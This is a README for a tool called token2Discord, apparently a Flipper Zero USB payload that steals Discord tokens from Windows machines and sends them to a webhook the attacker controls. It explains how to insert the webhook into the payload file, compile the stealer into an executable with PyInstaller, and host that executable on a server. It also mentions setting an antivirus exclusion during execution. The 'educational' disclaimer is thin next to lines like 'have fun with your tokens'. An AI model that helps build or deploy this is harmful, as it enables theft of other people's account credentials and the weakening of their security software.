# token2Discord

# Disclaimer
This utility is strictly for educational and/or purposes of which an employer has authority to do so.
The user, YOU, are responsible for the usage of such utility. With that said, use it wisely and legally.

# Prerequisites
```
1. Python3 (optional if building your own payload)
2. Discord Webhook
```
# Setup
```
# Plug and Play!!
# edit token2Discord.txt
Input your discord webhook in the payload file (txt file)
$webhook = 'DISCORD_WEBHOOK'
```
Save token2Discord.txt to flipper, and have fun with your tokens!!!

# Compile (if you want your own)
• Be sure PyInstaller is installed
$ pip3 install -r requirements.txt
* When compiling as an executable, be sure you're on Windows for a Windows payload!! (Common Sense, as MacOS compiled payload will not run on a Windows!)
```
python3 -m PyInstaller token2Discord.py --onefile
```
* After compiling:
  - Inside the /dist directory is your exe file
* Upload exe to a server, local python server, etc... do as you will.

# Key note
* this is not made to bypass AV, but rather sets an exclusion at C:\temp, then resets such  
